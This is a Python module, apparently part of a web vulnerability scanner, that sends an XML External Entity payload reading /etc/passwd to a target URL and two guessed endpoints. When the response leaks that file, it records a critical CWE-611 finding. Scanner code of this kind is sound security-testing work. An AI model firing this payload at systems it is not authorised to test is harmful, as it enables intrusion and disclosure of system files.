from snapescape_api.engines.base import BaseEngine, new_finding

XXE_PAYLOAD = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""


class XxeEngine(BaseEngine):
    async def analyze(self, url: str, scan_id: str) -> list[dict]:
        findings = []
        endpoints = [url, url.rstrip("/") + "/api/xml", url.rstrip("/") + "/upload"]
        for ep in endpoints:
            try:
                resp = await self.client.post(
                    ep, content=XXE_PAYLOAD,
                    headers={"Content-Type": "application/xml"},
                )
                body = resp.text
                if "root:" in body or "/bin/" in body:
                    findings.append(new_finding(
                        scan_id, "XML External Entity Injection", "critical", "xxe", ep,
                        {"payload": XXE_PAYLOAD[:100], "response_preview": body[:200]},
                        0.96, "CWE-611", "A05:2021", "T1190",
                    ))
                    return findings
            except Exception:
                pass
        return findings
